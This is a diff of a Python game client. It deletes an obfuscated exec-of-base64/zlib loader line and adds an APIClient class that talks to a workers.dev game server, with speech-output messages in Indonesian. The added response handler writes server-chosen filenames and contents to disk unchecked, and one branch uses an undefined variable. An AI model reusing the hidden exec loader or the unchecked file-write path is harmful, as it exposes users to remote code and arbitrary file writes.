@@ -1,2 +1,176 @@
-import base64, zlib
-exec(zlib.decompress(base64.b64decode(b'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')))
+import requests
+import json
+import logging
+
+class APIClient:
+    def __init__(self, manager):
+        self.manager = manager
+        self.base_url = "https://gd-project.nyamancenter1804.workers.dev"
+        self.session = requests.Session()
+        
+    
+    def verify_token(self):
+        self.manager.tts.speak("Sedang memverifikasi token ke server...")
+        try:
+            payload = {"token": self.manager.player.token}
+            headers = {"Content-Type": "application/json"}
+            
+            try:
+                response = self.session.post(f"{self.base_url}/api/verify", json=payload, headers=headers, timeout=10)
+            except requests.exceptions.ConnectionError:
+                # Retry sekali jika koneksi keep-alive diputus server (WinError 10054)
+                response = self.session.post(f"{self.base_url}/api/verify", json=payload, headers=headers, timeout=10)
+                
+            data = response.json() if response.status_code in [200, 401, 403, 404, 500] else {}
+            if data.get("status") == "requires_otp":
+                import wx
+                wx.CallAfter(self.manager.akun_ui.show_otp_dialog, email)
+            elif response.status_code == 200:
+                if data.get("error"):
+                    self.manager.tts.speak(data["error"])
+                    self.manager.menus.show_main_menu()
+                else:
+                    self.manager.player.username = data.get("playername", data.get("data", {}).get("playername", self.manager.player.username))
+                    self.manager.player.role = data.get("role", data.get("data", {}).get("role", self.manager.player.role))
+                    if hasattr(self.manager, 'chat'):
+                        self.manager.chat.sambungkan()
+                        self.manager.chat.update_role(self.manager.player.role)
+                    if data.get("ambient_sound") and hasattr(self.manager, 'ambience'):
+                        self.manager.ambience.play(data["ambient_sound"])
+                    self.manager.state = 'IN_GAME'
+                    import wx
+                    wx.CallAfter(self.manager.panel.Hide)
+                    wx.CallAfter(self.manager.frame.Layout)
+                    wx.CallAfter(self.manager.build_menu_bar)
+                    wx.CallAfter(self.manager.frame.SetFocus)
+                    
+                    self.manager.audio.stop('menumus8.ogg')
+                    try:
+                        self.manager.game.start()
+                    except Exception as e:
+                        import logging, traceback
+                        logging.error("GAME START ERROR: " + traceback.format_exc())
+                    
+                    try:
+                        self.manager.tt.start(self.manager.player.username)
+                    except Exception as e:
+                        import logging, traceback
+                        logging.error("TT START ERROR: " + traceback.format_exc())
+            else:
+                self.manager.tts.speak(f"Gagal memverifikasi akun (Error {response.status_code}).")
+                self.manager.menus.show_main_menu()
+        except Exception as e:
+            import logging, traceback
+            logging.error("VERIFY TOKEN ERROR: " + traceback.format_exc())
+            self.manager.tts.speak("Gagal menghubungi server.")
+            self.manager.menus.show_main_menu()
+            
+    def send_chat(self, chat_type, message):
+        try:
+            payload = {
+                "token": self.manager.player.token,
+                "message": message,
+                "type": chat_type,
+                "map_name": self.manager.player.current_map
+            }
+            headers = {"Content-Type": "application/json"}
+            import requests
+            requests.post(f"{self.base_url}/api/chat", json=payload, headers=headers, timeout=5)
+        except:
+            pass
+
+    def logout(self):
+        try:
+            payload = {"token": self.manager.player.token}
+            headers = {"Content-Type": "application/json"}
+            self.session.post(f"{self.base_url}/api/logout", json=payload, headers=headers, timeout=5)
+        except:
+            pass
+
+    def send_action(self, action_name):
+        self.manager.tts.speak("Memproses...")
+        try:
+            payload = {
+                "token": self.manager.player.token,
+                "action": action_name
+            }
+            headers = {"Content-Type": "application/json"}
+            
+            try:
+                response = self.session.post(f"{self.base_url}/api/aksi", json=payload, headers=headers, timeout=10)
+            except requests.exceptions.ConnectionError:
+                response = self.session.post(f"{self.base_url}/api/aksi", json=payload, headers=headers, timeout=10)
+                
+            if response.status_code == 200:
+                data = response.json()
+                self._handle_server_response(data)
+            elif response.status_code == 401:
+                self.manager.player.username = ""
+                self.manager.player.token = ""
+                self.manager.player.save_profile()
+                self.manager.tts.speak("Sesi kadaluarsa atau akun telah dihapus. Silakan login kembali.")
+                self.manager.menus.show_main_menu()
+            else:
+                self.manager.tts.speak(f"Error server: {response.status_code}")
+        except Exception as e:
+            logging.error(f"API Error: {e}")
+            self.manager.tts.speak("Gagal menghubungi server.")
+
+    def _handle_server_response(self, data):
+        # Selalu update current_map jika disediakan server (agar tombol C / polling sinkron)
+        if data.get("current_map"):
+            self.manager.player.current_map = data["current_map"]
+            if hasattr(self.manager, 'chat'):
+                self.manager.chat.update_peta(data["current_map"])
+                
+        if data.get("ambient_sound"):
+            if hasattr(self.manager, 'ambience'):
+                self.manager.ambience.play(data["ambient_sound"])
+            
+        if "error" in data:
+            self.manager.tts.speak(data["error"])
+            return
+
+        if data.get("fileToSave") and data["fileToSave"].get("filename"):
+            file_data = data["fileToSave"]
+            try:
+                with open(file_data["filename"], "w", encoding="utf-8") as f:
+                    f.write(file_data["content"])
+                if file_data.get("caption"):
+                    self.manager.tts.speak(file_data["caption"])
+                else:
+                    self.manager.tts.speak(f"File {file_data['filename']} berhasil disimpan.")
+            except Exception as e:
+                pass
+
+        if data.get("alertText"):
+            if data["alertText"] == "TRIGGER_MAP_MAKER":
+                self.manager.tts.speak("Memasuki pembuat map.")
+            else:
+                self.manager.tts.speak(data["alertText"])
+
+        if data.get("success"):
+            if data.get("requestInput"):
+                self.manager.menus.show_input_dialog(data.get("text", "Masukan Server:"))
+            elif data.get("buttons") and len(data["buttons"]) > 0:
+                self.manager.menus.show_server_menu(data["text"], data["buttons"])
+            else:
+                # Tidak ada input dan tidak ada tombol -> Akhir dari dialog menu server
+                self.manager.state = 'IN_GAME'
+                if data.get("text"):
+                    self.manager.tts.speak(data["text"])
+                elif not data.get("alertText"):
+                    self.manager.tts.speak("Server mengembalikan respon kosong tanpa tombol.")
+
+
+
+
+
+
+
+
+
+
+
+
+
